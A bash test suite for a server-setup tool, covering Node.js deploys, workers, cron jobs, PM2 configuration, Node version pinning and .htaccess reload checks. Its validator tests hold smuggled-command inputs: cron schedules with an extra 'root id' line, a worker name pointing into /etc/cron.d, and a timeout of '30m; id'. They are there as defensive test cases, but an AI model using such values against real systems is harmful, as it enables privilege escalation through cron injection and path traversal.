D_DOMAIN="git.example.com"; D_IDENT="git_example_com"; D_USER="git_example_com"; D_GROUP="git_example_com"
D_HOME="$SITES_ROOT/git.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3300"; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
_dj="$(lib_domain_json git.example.com)"; _dlog="$(lib_domain_state_dir git.example.com)/deploy.log"
_orig_fetch="$(declare -f lib_app_fetch)"; _orig_build="$(declare -f lib_app_build)"; _orig_git="$(declare -f _app_git)"
_quiet_deploy() { lib_app_deploy_run >/dev/null 2>&1; }
lib_app_fetch() { printf 'cloning https://oauth2:leaked-token-123@example.com/x.git\n'; APP_GIT_COMMIT="abc1234"; return 0; }
lib_app_build() { printf 'npm ci ok\n'; return 0; }
APP_GIT_URL="git@github.com:o/r.git"; APP_GIT_BRANCH="main"; APP_DEPS_HASH=""
assert_true  "a deploy that works succeeds"      _quiet_deploy
assert_eq    "the commit is recorded"            "abc1234" "$(jq -r '.app.last_deploy.commit' "$_dj")"
assert_eq    "the deploy is recorded as ok"      "true"    "$(jq -r '.app.last_deploy.ok' "$_dj")"
assert_has   "the deploy output is kept"         "npm ci ok" "$(cat "$_dlog")"
assert_lacks "with secrets masked"               "leaked-token-123" "$(cat "$_dlog")"
_app_deps_record "hash-1" >/dev/null 2>&1
assert_eq    "an install records its dependency hash" "hash-1" "$(jq -r '.app.deps_hash' "$_dj")"
_app_deps_record "" >/dev/null 2>&1
assert_eq    "an install under way clears it"         "null"   "$(jq -r '.app.deps_hash' "$_dj")"
# a build that fails on fetched code puts the previous commit back and builds that again
_git_calls=""; _builds=0
_app_git() { _git_calls+="$* | "; if [[ "$*" == *"rev-parse --verify -q HEAD"* ]]; then printf 'newcommitsha\n'; fi; return 0; }
lib_app_fetch() { APP_GIT_PREV="oldcommitsha"; APP_GIT_COMMIT="newcomm"; return 0; }
lib_app_build() {
  _builds=$((_builds + 1))
  if (( _builds == 1 )); then printf 'npm ERR! boom\n'; APP_BUILD_ERROR="npm run build failed"; return 1; fi
  printf 'rebuilt the old commit\n'; return 0
}
assert_false "a failed build fails the deploy"          _quiet_deploy
assert_has   "the previous commit is checked out again" "-C app checkout -q -f -B main oldcommitsha" "$_git_calls"
assert_eq    "and built again"                          "2" "$_builds"
assert_has   "the error says the app was put back"      "put back on oldcomm" "$APP_BUILD_ERROR"
assert_eq    "the failure is recorded"                  "false"   "$(jq -r '.app.last_deploy.ok' "$_dj")"
assert_eq    "with the commit that failed"              "newcomm" "$(jq -r '.app.last_deploy.commit' "$_dj")"
assert_has   "the rebuild is in the deploy log"         "rebuilt the old commit" "$(cat "$_dlog")"
eval "$_orig_git"
lib_app_fetch() { APP_BUILD_ERROR="clone failed"; return 1; }
lib_app_build() { printf 'should not run\n'; return 0; }
assert_false "a failed fetch fails the deploy"   _quiet_deploy
assert_lacks "and nothing is built after it"     "should not run" "$(cat "$_dlog")"
APP_GIT_URL=""
lib_app_build() { printf 'built without git\n'; return 0; }
assert_true  "without a repository only the build runs" _quiet_deploy
assert_has   "and its output is kept"            "built without git" "$(cat "$_dlog")"
eval "$_orig_fetch"; eval "$_orig_build"

# the install: which command, NODE_ENV kept out of it, and the dependency hash around it
_orig_as2="$(declare -f _app_as)"; _orig_limits="$(declare -f _app_build_limits)"
_as_cmds=""; _install_rc=0
_app_as() {
  local dir="$1"; shift
  if [[ "$1" == "timeout" && "$2" == "-k" ]]; then _as_cmds+="${*: -1} | "; return "$_install_rc"; fi
  ( cd "$dir" && "$@" )
}
_app_build_limits() { APP_AS_WRAP=(); }
mkdir -p "$D_HOME/app"
printf '{"name":"x","version":"1.0.0"}' >"$D_HOME/app/package.json"
APP_DEPS_HASH=""
assert_true  "build: a project without a lockfile"        lib_app_build
assert_has   "installs without creating a lockfile"       "npm install --include=dev --no-package-lock" "$_as_cmds"
assert_has   "with NODE_ENV out of the way"               "unset NODE_ENV" "$_as_cmds"
assert_eq    "and records the hash once it is installed"  "$APP_DEPS_HASH_NEW" "$(jq -r '.app.deps_hash' "$_dj")"
: >"$D_HOME/app/package-lock.json"; _as_cmds=""
assert_true  "build: a project with a lockfile"           lib_app_build
assert_has   "installs exactly that lockfile"             "npm ci --include=dev" "$_as_cmds"
_install_rc=1; printf '{"name":"x","version":"1.0.1"}' >"$D_HOME/app/package.json"
assert_false "build: a failing install fails"             lib_app_build
assert_eq    "and leaves no dependency hash behind"       "null" "$(jq -r '.app.deps_hash' "$_dj")"
_install_rc=0
eval "$_orig_as2"; eval "$_orig_limits"

# a step's output goes to the deploy log; a process it leaves behind cannot hold things up
_lf="$TMP/logged.out"; : >"$_lf"
_app_logged "$_lf" bash -c 'echo step-output; exit 3' >/dev/null 2>&1 && _lrc=0 || _lrc=$?
assert_eq  "_app_logged returns the status of the step" "3" "$_lrc"
assert_has "and keeps its output"                       "step-output" "$(cat "$_lf")"
_t0=$SECONDS
_app_logged "$_lf" bash -c 'sleep 30 & echo left-behind' >/dev/null 2>&1 || true
assert_true "a process left behind does not hold the deploy up" test $((SECONDS - _t0)) -lt 15
# tee lives as long as such a process does: it must not keep the site or the global lock
assert_has "the deploy log's tee holds no lock descriptor" "200>&- 201>&-" "$(declare -f _app_logged)"
rm -rf "$(lib_domain_state_dir git.example.com)"
lib_domain_state_reset

# =============================================================================
section "Node.js applications: workers and scheduled jobs"
assert_true  "worker name: queue"                    lib_app_worker_name_valid queue
assert_true  "worker name: digits and -"             lib_app_worker_name_valid mail-2
assert_false "worker name: web is the application"   lib_app_worker_name_valid web
assert_false "worker name: all would delete all"     lib_app_worker_name_valid all
assert_false "worker name: upper case"               lib_app_worker_name_valid Queue
assert_false "worker name: leading digit"            lib_app_worker_name_valid 1queue
assert_true  "cwd: app/worker"                       lib_app_cwd_valid app/worker
assert_false "cwd: no parent directory"              lib_app_cwd_valid ../other.example.com
assert_false "cwd: no absolute path"                 lib_app_cwd_valid /etc
assert_true  "cron: every five minutes"              lib_app_cron_valid "*/5 * * * *"
assert_true  "cron: weekdays at 03:30"               lib_app_cron_valid "30 3 * * 1-5"
assert_true  "cron: lists and ranges with steps"     lib_app_cron_valid "0,30 8-18/2 1,15 * *"
assert_true  "cron: month and weekday names"         lib_app_cron_valid "0 4 * jan sun"
assert_true  "cron: Sunday as 7"                     lib_app_cron_valid "0 0 * * 7"
assert_true  "cron: @daily"                          lib_app_cron_valid "@daily"
assert_false "cron: four fields"                     lib_app_cron_valid "* * * *"
assert_false "cron: a sixth field (a user?)"         lib_app_cron_valid "* * * * * root"
assert_false "cron: a second line"                   lib_app_cron_valid $'* * * * *\n* * * * * root id'
assert_false "cron: minute 60"                       lib_app_cron_valid "60 * * * *"
assert_false "cron: hour 24"                         lib_app_cron_valid "0 24 * * *"
assert_false "cron: day 0"                           lib_app_cron_valid "0 0 0 * *"
assert_false "cron: step 0"                          lib_app_cron_valid "*/0 * * * *"
assert_false "cron: a backwards range"               lib_app_cron_valid "30-10 * * * *"
assert_false "cron: an empty list item"              lib_app_cron_valid "1,,2 * * * *"
assert_false "cron: a range of names"                lib_app_cron_valid "0 0 * jan-mar *"
assert_false "cron: @reboot is no schedule"          lib_app_cron_valid "@reboot"
assert_true  "timeout: 30m"                          lib_app_timeout_valid 30m
assert_false "timeout: 0"                            lib_app_timeout_valid 0
assert_false "timeout: words"                        lib_app_timeout_valid "1 hour"

lib_domain_state_reset
D_DOMAIN="work.example.com"; D_IDENT="work_example_com"; D_USER="work_example_com"; D_GROUP="work_example_com"
D_HOME="$SITES_ROOT/work.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3400"; D_STATIC_PATHS=""
D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
mkdir -p "$D_HOME/app"
lib_domain_state_save
APP_PORT=3400; APP_START="npm start"; APP_SCRIPT=""; APP_MEMORY=""; APP_ENABLED=1; APP_GIT_URL=""; APP_GIT_BRANCH=""
lib_app_state_write work.example.com
D_HOME="$SITES_ROOT/work.example.com"
_wj() { lib_app_workers_json work.example.com; }
lib_app_worker_state_set work.example.com '{"name":"queue","start":"node worker.js --queue=mail","cwd":"app","port":null,"memory":"256M","cron":null,"timeout":null,"enabled":true}'
lib_app_worker_state_set work.example.com '{"name":"api","start":"node api.js","cwd":"app/api","port":3401,"memory":null,"cron":null,"timeout":null,"enabled":true}'
lib_app_worker_state_set work.example.com '{"name":"cleanup","start":"npm run cleanup","cwd":"app","port":null,"memory":null,"cron":"*/5 * * * *","timeout":"30m","enabled":true}'
lib_app_worker_state_set work.example.com '{"name":"paused","start":"node p.js","cwd":"app","port":null,"memory":null,"cron":null,"timeout":null,"enabled":false}'
assert_eq "workers are kept in name order" "api cleanup paused queue" "$(jq -r 'map(.name) | join(" ")' <<<"$(_wj)")"
lib_domain_state_load work.example.com; lib_domain_state_save; D_HOME="$SITES_ROOT/work.example.com"
assert_eq "a domain.json save keeps the workers" "4" "$(jq 'length' <<<"$(_wj)")"
_orig_holder2="$(declare -f lib_port_holder)"; lib_port_holder() { :; }
assert_eq "a worker's port belongs to its site" "port 3401 is already used by work.example.com" "$(lib_app_port_conflict 3401 other.example.com || true)"

_weco="$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{"API_KEY":"k"}' "$(_wj)" 1)"
_we() { jq -r "$1" <<<"$_weco"; }
assert_eq "ecosystem: the web process and the running workers" "web api queue" "$(_we '[.apps[].name] | join(" ")')"
assert_eq "a scheduled job is no PM2 process"          "0" "$(_we '[.apps[] | select(.name == "cleanup")] | length')"
assert_eq "a stopped worker is left out"               "0" "$(_we '[.apps[] | select(.name == "paused")] | length')"
assert_eq "a worker's command is split into words"     'node ["worker.js","--queue=mail"]' "$(_we '.apps[] | select(.name == "queue") | "\(.script) \(.args | tojson)"')"
assert_eq "a worker without a port gets no PORT"       "null" "$(_we '.apps[] | select(.name == "queue") | .env.PORT')"
assert_eq "a worker with a port gets it"               "3401" "$(_we '.apps[] | select(.name == "api") | .env.PORT')"
assert_eq "it runs in its own directory"               "$D_HOME/app/api" "$(_we '.apps[] | select(.name == "api") | .cwd')"
assert_eq "workers get the application's variables"    "k"    "$(_we '.apps[] | select(.name == "queue") | .env.API_KEY')"
assert_eq "and their own memory limit"                 "256M" "$(_we '.apps[] | select(.name == "queue") | .max_memory_restart')"
assert_eq "and their own logs"                         "$D_HOME/.pm2/logs/queue-out.log" "$(_we '.apps[] | select(.name == "queue") | .out_file')"
assert_eq "without code for the web process the workers still run" "api queue" \
  "$(MSYS_NO_PATHCONV=1 lib_app_render_ecosystem '{"script":"npm","args":["start"]}' '{}' "$(_wj)" 0 | jq -r '[.apps[].name] | join(" ")')"

_old='{"apps":[{"name":"web","script":"a"},{"name":"queue","script":"q"},{"name":"gone","script":"g"}]}'
_new='{"apps":[{"name":"web","script":"a"},{"name":"queue","script":"q2"},{"name":"api","script":"n"}]}'
assert_eq "changes: a removed process goes, a changed or new one starts" "delete gone,start api,start queue," \
  "$(_app_process_changes "$_old" "$_new" "" "" "web queue gone" | sort | tr '\n' ',')"
assert_eq "changes: nothing changed, nothing happens"   "" "$(_app_process_changes "$_new" "$_new" "" "" "web queue api")"
assert_eq "changes: a restart starts everything again"  "start api,start queue,start web," "$(_app_process_changes "$_new" "$_new" restart "" "web queue api" | sort | tr '\n' ',')"
assert_eq "changes: or just the process named"          "start queue" "$(_app_process_changes "$_new" "$_new" restart queue "web queue api")"
assert_eq "changes: without an old ecosystem all start" "start api,start queue,start web," "$(_app_process_changes "" "$_new" "" "" "" | sort | tr '\n' ',')"
# PM2's own list decides what is there. The ecosystem file lives in the site's home, so its
# user could otherwise hide a process from "stop" by rewriting it, and a process PM2 lost
# would never come back.
assert_eq "changes: a forged old ecosystem cannot hide a deletion" "delete queue" \
  "$(_app_process_changes '{"apps":[{"name":"web","script":"a"}]}' '{"apps":[{"name":"web","script":"a"}]}' "" "" "web queue")"
assert_eq "changes: a process PM2 lost is started again" "start queue" \
  "$(_app_process_changes "$_new" "$_new" "" "" "web api")"
assert_eq "changes: an old ecosystem of the wrong shape is ignored" "start web" \
  "$(_app_process_changes '[]' '{"apps":[{"name":"web","script":"a"}]}' "" "" "")"
assert_eq "changes: a corrupt one too"                             "start web" \
  "$(_app_process_changes 'not json at all' '{"apps":[{"name":"web","script":"a"}]}' "" "" "")"
# the ecosystems carry every process's variables: too big for an environment variable, so they
# travel as files
_bigeco="$(jq -cn '{apps: [range(0;60) | {name: ("w" + tostring), script: "s", env: {BIG: ("x" * 3000)}}]}')"
_bignames="$(jq -rn '[range(0;60) | "w" + tostring] | join(" ")')"
assert_eq "changes: an ecosystem larger than an environment variable still reconciles" "" \
  "$(_app_process_changes "$_bigeco" "$_bigeco" "" "" "$_bignames")"
assert_eq "a process list of the wrong shape leaves the workers alone" "not running" \
  "$(_app_workers_status '[{"name":"queue","cron":null,"enabled":true}]' '["a","b"]' | jq -r '.[0].status')"

_job='{"name":"cleanup","start":"npm run cleanup","cwd":"app","cron":"*/5 * * * *","timeout":"30m","enabled":true}'
_js="$(lib_app_render_job "$_job")"
printf '%s\n' "$_js" >"$TMP/job.sh"
assert_true  "the job script is valid bash"             bash -n "$TMP/job.sh"
assert_has   "one run at a time"                        "flock -n 9" "$_js"
assert_has   "a run that takes too long is stopped"     'timeout -k 60 "30m" npm run cleanup 9>&-' "$_js"
assert_has   "it runs in the worker's directory"        "cd \"$D_HOME/app\"" "$_js"
assert_has   "with the application's environment"       ". \"$D_HOME/.pm2/lomp.env\"" "$_js"
assert_has   "its output goes to the job log"           "$D_HOME/.pm2/logs/cleanup-job.log" "$_js"
assert_has   "a skipped run says so"                    "cleanup skipped: the previous run is still going" "$_js"
assert_has   "a job without a timeout gets the default" 'timeout -k 60 "1h"' "$(lib_app_render_job '{"name":"x","start":"node x.js"}')"
assert_has   "a job that cannot take its lock stops"    "cannot take its lock file" "$_js"
# the last gate before the shared cron file: "worker add" is not the only way state gets here
# (a restored archive, a hand-edited domain.json), and one line cron cannot parse makes it
# ignore the whole file - the backups and the certificate renewals in it included
assert_false "a smuggled command gets no cron line"   lib_app_job_line '{"name":"six","start":"node x.js","cron":"* * * * * root id"}'
assert_false "and no script"                          lib_app_render_job '{"name":"six","start":"node x.js","cron":"* * * * * root id","timeout":"1h"}'
assert_false "a name that is a path gets no cron line" lib_app_job_line '{"name":"../../etc/cron.d/evil","start":"node x.js","cron":"* * * * *"}'
assert_false "a timeout that is a command gets no script" lib_app_render_job '{"name":"x","start":"node x.js","cron":"* * * * *","timeout":"30m; id"}'
assert_false "a start of only spaces gets no script"      lib_app_render_job '{"name":"x","start":"   ","cron":"* * * * *"}'
assert_has   "files in the site's home are read with a bound" "timeout 5 head -c" "$(declare -f _app_read_as_user)"
assert_has   "and written with noclobber, so a planted pipe fails instead of blocking" "set -C" "$(declare -f _app_write_as_user)"
assert_eq    "root never reads a file of theirs unbounded" "" "$(grep -nE '_app_as "\$D_HOME" cat ' "$ROOT/lib/app.sh" || true)"
assert_eq    "the cron line runs the script as the site user" "*/5 * * * * work_example_com /bin/bash $D_HOME/.pm2/jobs/cleanup.sh" "$(lib_app_job_line "$_job")"
assert_has   "a % in the cron line is escaped"          'a\%b' "$(D_HOME="/home/a%b" lib_app_job_line "$_job")"

_orig_lock3="$(declare -f _app_site_lock)"; _orig_tools3="$(declare -f lib_require_tools)"
_app_site_lock() { return 0; }; lib_require_tools() { return 0; }
printf 'SHELL=/bin/bash\n' >"$CRON_FILE"
lib_cron_set "wpcron:other.example.com" "*/5 * * * * other true"
lib_cron_set "job:work.example.com.evil:x" "* * * * * evil true"
_app_jobs_sync
assert_has   "a job gets its cron entry" "*/5 * * * * work_example_com /bin/bash $D_HOME/.pm2/jobs/cleanup.sh # server-setup:job:work.example.com:cleanup" "$(cat "$CRON_FILE")"
assert_eq    "and only jobs do"          "1" "$(grep -c 'server-setup:job:work.example.com:' "$CRON_FILE")"
_app_set_enabled 0 cleanup; _app_jobs_sync
assert_false "a stopped job loses its entry" grep -q 'job:work.example.com:cleanup' "$CRON_FILE"
_app_set_enabled 1 cleanup; _app_jobs_sync
assert_true  "and gets it back when started" grep -q 'job:work.example.com:cleanup' "$CRON_FILE"
lib_cron_remove_prefix "job:work.example.com:"
assert_false "removing the site's jobs"                        grep -q 'job:work.example.com:' "$CRON_FILE"
assert_true  "keeps a site whose name merely starts the same"  grep -q 'job:work.example.com.evil:x' "$CRON_FILE"
assert_true  "and every other entry"                           grep -q 'wpcron:other.example.com' "$CRON_FILE"
assert_eq    "the header is there once" "1" "$(grep -c '^SHELL=' "$CRON_FILE")"
assert_has   "remove clears the site's jobs" 'lib_cron_remove_prefix "job:${domain}:"' "$(declare -f lib_domain_remove_main)"
# state that was not written by "worker add" (a restored archive, a hand-edited domain.json)
lib_app_worker_state_set work.example.com '{"name":"evil","start":"node x.js","cwd":"app","port":null,"memory":null,"cron":"* * * * * root id","timeout":"1h","enabled":true}'
_app_jobs_sync >/dev/null 2>&1
assert_false "a job cron would choke on never reaches the file" grep -q 'root id' "$CRON_FILE"
assert_true  "and the sound ones stay"                         grep -q 'job:work.example.com:cleanup' "$CRON_FILE"
lib_app_worker_state_del work.example.com evil
printf 'job:work.example.com:bad\t{ "a": 1 }\n' | lib_cron_replace_prefix "job:work.example.com:" >/dev/null 2>&1
assert_false "an entry that is not schedule + user + command is refused" grep -q '"a": 1' "$CRON_FILE"
_app_jobs_sync >/dev/null 2>&1

# add and remove, with the service stubbed
_orig_apply="$(declare -f lib_app_apply)"; _orig_wrep="$(declare -f _app_worker_report)"; _orig_as3="$(declare -f _app_as)"
# through eval: a plain definition this far down the file makes shellcheck read the calls to
# the real lib_app_apply further up as calls to a function that is only defined later (SC2218)
eval 'lib_app_apply() { APP_RESULT="running"; return 0; }'
eval '_app_worker_report() { return 0; }'
eval '_app_as() { local dir="$1"; shift; ( cd "$dir" && "$@" ); }'
assert_eq "add: --start is required"               1 "$(run_isolated lib_app_worker_add mailer --cwd app)"
assert_eq "add: a shell command is refused"        1 "$(run_isolated lib_app_worker_add mailer --start "node a.js | tee x")"
assert_eq "add: a job takes no port"               1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cron "* * * * *" --port 3500)"
assert_eq "add: --timeout needs --cron"            1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --timeout 5m)"
assert_eq "add: a schedule cron would reject"      1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cron "61 * * * *")"
assert_eq "add: a name that is taken"              1 "$(run_isolated lib_app_worker_add queue --start "node a.js")"
assert_eq "add: the application's own port"        1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --port 3400)"
assert_eq "add: another worker's port"             1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --port 3401)"
assert_eq "add: a directory outside the home"      1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cwd ../x)"
if (( CAN_SYMLINK )); then
  ln -s "$TMP" "$D_HOME/escape"
  assert_eq "add: a link that leads out of the home" 1 "$(run_isolated lib_app_worker_add mailer --start "node a.js" --cwd escape)"
  rm -f "$D_HOME/escape"
fi
lib_app_worker_add mailer --start "node mail.js" --cron "0  3 * * *" >/dev/null 2>&1
assert_eq "add: the job is stored, its schedule tidied" "0 3 * * *" "$(jq -r '.[] | select(.name == "mailer") | .cron' <<<"$(_wj)")"
assert_eq "add: with the default timeout"               "1h"        "$(jq -r '.[] | select(.name == "mailer") | .timeout' <<<"$(_wj)")"
assert_true "add: and scheduled" grep -q 'job:work.example.com:mailer' "$CRON_FILE"
lib_app_worker_remove mailer >/dev/null 2>&1
assert_eq "remove: the worker is gone"                  "" "$(jq -r '.[] | select(.name == "mailer") | .name' <<<"$(_wj)")"
assert_false "remove: and its cron entry"               grep -q 'job:work.example.com:mailer' "$CRON_FILE"
assert_eq "--process must name a process of the site"   1 "$(run_isolated _app_parse_process start work.example.com --process nope)"
assert_eq "an option without its value is a usage error" 1 "$(run_isolated lib_app_start work.example.com --process)"
assert_eq "for worker add as well"                       1 "$(run_isolated lib_app_worker_add mailer --start)"
assert_eq "a job has no process to restart"             1 "$(run_isolated lib_app_restart work.example.com --process cleanup)"
_app_set_enabled 0 ""
assert_eq "stop without --process: the application and every worker" '[false,[false]]' "$(jq -c '[.app.enabled, (.workers | map(.enabled) | unique)]' "$(lib_domain_json work.example.com)")"
_app_set_enabled 1 queue
assert_eq "start --process: that worker alone" '[false,true,false]' \
  "$(jq -c '[.app.enabled, (.workers[] | select(.name == "queue") | .enabled), (.workers[] | select(.name == "api") | .enabled)]' "$(lib_domain_json work.example.com)")"
_app_set_enabled 1 web
assert_eq "--process web: the application alone" 'true false' "$(jq -r '"\(.app.enabled) \(.workers[] | select(.name == "api") | .enabled)"' "$(lib_domain_json work.example.com)")"
assert_has "setup.sh: listing workers and running a job take no global lock" 'worker) case "${rest[2]:-list}" in list|run|help' "$(cat "$ROOT/setup.sh")"
eval "$_orig_apply"; eval "$_orig_wrep"; eval "$_orig_as3"; eval "$_orig_lock3"; eval "$_orig_tools3"; eval "$_orig_holder2"
rm -rf "$(lib_domain_state_dir work.example.com)"
lib_domain_state_reset

# =============================================================================
section "Node.js major version (regression: an install re-run upgraded Node under running apps)"
# Every "install" re-run called lib_install_node for a server that had Node, with the DEFAULT
# major: the NodeSource repository was rewritten and the next apt run jumped a major version.
_mf="$STATE_DIR/manifest.json"; cp "$_mf" "$TMP/manifest.node.save"
lib_json_set "$_mf" 'del(.params.node_major) | del(.components.node)'
assert_eq "a server without Node gets the current LTS" "$INS_NODE_DEFAULT_MAJOR" "$(lib_install_node_major_resolve)"
assert_eq "an explicit --node wins" "22" "$(lib_install_node_major_resolve 22)"
lib_manifest_set '.components.node' 'v20.18.1'
assert_eq "a server set up before the major was recorded keeps it" "20" "$(lib_install_node_major_resolve)"
lib_manifest_set '.params.node_major' '22'
assert_eq "the recorded major wins over the installed version" "22" "$(lib_install_node_major_resolve)"
assert_eq "--node still changes it on purpose" "24" "$(lib_install_node_major_resolve 24)"
assert_eq "install re-run without --node keeps it" "22" "$( ( lib_install_parse_args --with-python --skip-upgrade >/dev/null 2>&1; printf '%s' "$INS_NODE_MAJOR" ) )"
assert_eq "install --node 24 takes the new one" "24" "$( ( lib_install_parse_args --node 24 --skip-upgrade >/dev/null 2>&1; printf '%s' "$INS_NODE_MAJOR" ) )"
assert_eq "an invalid --node is refused" 1 "$(run_isolated lib_install_parse_args --node 2x)"
cp "$TMP/manifest.node.save" "$_mf"
# PM2 is never started as root any more: every Node site runs its own daemon as its own user
_node_fn="$(declare -f lib_install_node)"
assert_lacks "no root pm2 startup unit" "startup systemd -u root" "$_node_fn"
assert_lacks "no pm2 call that would spawn a root daemon" "pm2 -v" "$_node_fn"
assert_lacks "no root pm2-logrotate module" "pm2-logrotate" "$_node_fn"
assert_has   "pm2 pinned to one major" 'pm2@${PM2_MAJOR}' "$_node_fn"
assert_has   "the major is recorded" ".params.node_major" "$_node_fn"

# =============================================================================
section "install re-run keeps --php, --admin-port and --timezone (regression: a bare re-run reset them)"
# These three were never read back from the manifest. A server installed with --php 8.2
# --admin-port 7574 --timezone UTC got LSPHP 8.3 as its default, its WebAdmin back on 7080 (the
# firewall rule for 7574 deleted) and its timezone reset whenever "install" ran without the
# original flags - which is also how the menu adds Node.js, Python, Netdata and mail.
_mf="$STATE_DIR/manifest.json"; cp "$_mf" "$TMP/manifest.rerun.save"
_rerun_manifest() {   # php admin_port timezone -> the manifest an earlier install leaves
  jq -n --arg php "$1" --arg ap "$2" --arg tz "$3" \
    '{version:"test", installed_at:"2026-09-01T00:00:00Z", components:{},
      params:{php:$php, admin_port:$ap, timezone:$tz, admin_access:"tunnel", admin_ip:""}}' >"$_mf"
}
_rerun_values() {   # the three settings a run ends up with, from the defaults setup.sh carries
  ( PHP_VERSION="8.3"; ADMIN_PORT="7080"; TIMEZONE="Europe/Istanbul"
    lib_install_parse_args "$@" >/dev/null 2>&1
    printf '%s %s %s' "$PHP_VERSION" "$ADMIN_PORT" "$TIMEZONE" )
}
_rerun_manifest 8.2 7574 UTC
assert_eq "a re-run without the flags keeps all three" "8.2 7574 UTC" "$(_rerun_values --skip-upgrade)"
assert_eq "and gets through the checks with errexit armed" 0 "$(run_isolated lib_install_parse_args --skip-upgrade)"
assert_eq "one flag changes its own setting only" "8.4 7574 UTC" "$(_rerun_values --php 8.4 --skip-upgrade)"
# a flag is a flag even when it names the built-in default: "== default" cannot mean "not given"
assert_eq "explicit flags win, even the built-in defaults" "8.3 7080 Europe/Istanbul" \
  "$(_rerun_values --php 8.3 --admin-port 7080 --timezone Europe/Istanbul --skip-upgrade)"
assert_eq "and any other value" "8.4 7575 Asia/Tokyo" \
  "$(_rerun_values --php 8.4 --admin-port 7575 --timezone Asia/Tokyo --skip-upgrade)"
assert_eq "explicit flags get through the checks with errexit armed" 0 \
  "$(run_isolated lib_install_parse_args --php 8.3 --admin-port 7080 --timezone Europe/Istanbul --skip-upgrade)"
assert_eq "without a manifest the defaults apply" "8.3 7080 Europe/Istanbul" \
  "$(STATE_DIR="$TMP/no-state"; _rerun_values --skip-upgrade)"
assert_eq "a first install gets through the checks with errexit armed" 0 \
  "$(STATE_DIR="$TMP/no-state"; run_isolated lib_install_parse_args --skip-upgrade)"
jq -n '{version:"test", components:{}, params:{}}' >"$_mf"
assert_eq "as they do while the manifest holds no settings yet" "8.3 7080 Europe/Istanbul" "$(_rerun_values --skip-upgrade)"
# a stored value is checked like the flag it stands in for, and the error says where it came from
_rerun_manifest 8 7574 UTC
assert_eq "a stored PHP version that is no version is refused" 1 "$(run_isolated lib_install_parse_args --skip-upgrade)"
assert_has "naming the manifest, not a flag nobody typed" "'8' (kept from ${STATE_DIR}/manifest.json)" \
  "$( ( lib_install_parse_args --skip-upgrade ) 2>&1 || true )"
assert_eq "--php replaces it" 0 "$(run_isolated lib_install_parse_args --php 8.2 --skip-upgrade)"
_rerun_manifest 8.2 587 UTC
assert_eq "a stored WebAdmin port that mail needs is refused" 1 "$(run_isolated lib_install_parse_args --skip-upgrade)"
_rerun_manifest 8.2 99 UTC
assert_eq "so is one below 1024" 1 "$(run_isolated lib_install_parse_args --skip-upgrade)"
assert_eq "--admin-port replaces it" 0 "$(run_isolated lib_install_parse_args --admin-port 7574 --skip-upgrade)"
# the timezone is checked where --timezone is, by the step that sets it. timedatectl is stubbed:
# a stored value that slipped through must not reset the timezone of the machine running this.
_rerun_manifest 8.2 7574 Mars/Olympus_Mons
_rerun_tz_step() { timedatectl() { return 0; }; lib_install_parse_args --skip-upgrade; lib_system_timezone_apply; }
assert_eq "a stored timezone that does not exist is refused" 1 "$(run_isolated _rerun_tz_step)"
cp "$TMP/manifest.rerun.save" "$_mf"

# =============================================================================
section ".htaccess is read once: the check that reloads OpenLiteSpeed"
# OpenLiteSpeed reads a document root's .htaccess while loading and never again, so a new or
# changed one only works after a reload. WordPress wrote its own after the last reload of
# "add", which left every permalink at 404.
lib_domain_state_reset
D_DOMAIN="wp.example.com"; D_IDENT="wp_example_com"; D_USER="wp_example_com"; D_GROUP="wp_example_com"
D_HOME="$SITES_ROOT/wp.example.com"; D_MODE="wordpress"; D_PHP="8.3"; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
_ht_wp="$SITES_ROOT/wp.example.com/public_html"
lib_domain_state_reset
D_DOMAIN="plain.example.com"; D_IDENT="plain_example_com"; D_USER="plain_example_com"; D_GROUP="plain_example_com"
D_HOME="$SITES_ROOT/plain.example.com"; D_MODE="static"; D_STATUS="active"; D_CREATED="2025-01-01T00:00:00Z"
lib_domain_state_save
_ht_st="$SITES_ROOT/plain.example.com/public_html"
mkdir -p "$_ht_wp/wp-content/uploads" "$_ht_st"
_ht_roots="$(lib_ols_htaccess_docroots)"
assert_has   "a WordPress site's .htaccess is watched" "$_ht_wp" "$_ht_roots"
assert_lacks "a static site's is not (OpenLiteSpeed never reads it)" "$_ht_st" "$_ht_roots"

_orig_olsrun="$(declare -f lib_ols_running)"; _orig_htreload="$(declare -f lib_ols_htaccess_reload)"
eval 'lib_ols_running() { return "${_ht_running_rc:-0}"; }'
eval 'systemctl() { if [[ "$*" == *ActiveEnterTimestamp* ]]; then printf "%s\n" "$_ht_started"; fi; return 0; }'
# A file cannot be made to have arrived earlier (its change time is the kernel's), so the
# server's start is what moves. The modification time can be anything: unzip, tar, rsync -a
# and an SFTP client that keeps dates (WinSCP does by default) write the one from the source.
: >"$_ht_wp/.htaccess"; : >"$_ht_st/.htaccess"
_ht_started="@$(( $(date +%s) + 1 ))"
assert_eq "an .htaccess that was there when the server started is in effect" "" "$(lib_ols_htaccess_pending)"
_ht_started="@$(( $(date +%s) - 600 ))"
assert_eq "one written after the server started waits for a reload" "$_ht_wp/.htaccess" "$(lib_ols_htaccess_pending)"
rm -f "$_ht_wp/.htaccess"   # the check names the first one it finds
: >"$_ht_wp/wp-content/uploads/.htaccess"; touch -d '-3 days' "$_ht_wp/wp-content/uploads/.htaccess"
assert_eq "so does one unpacked or uploaded with its older date" "$_ht_wp/wp-content/uploads/.htaccess" "$(lib_ols_htaccess_pending)"
_ht_started=""
assert_eq "without a start time (not run by systemd) nothing is said" "" "$(lib_ols_htaccess_pending)"
_ht_started="@$(( $(date +%s) - 600 ))"; _ht_running_rc=1
assert_eq "a stopped server has nothing waiting" "" "$(lib_ols_htaccess_pending)"
_ht_running_rc=0

_ht_log="$TMP/ht.reloads"; : >"$_ht_log"
eval 'lib_ols_htaccess_reload() { printf "%s\n" "$1" >>"$_ht_log"; return 0; }'
eval 'flock() { return "${_ht_flock_rc:-0}"; }'
_ht_count() { wc -l <"$_ht_log" | tr -d ' '; }
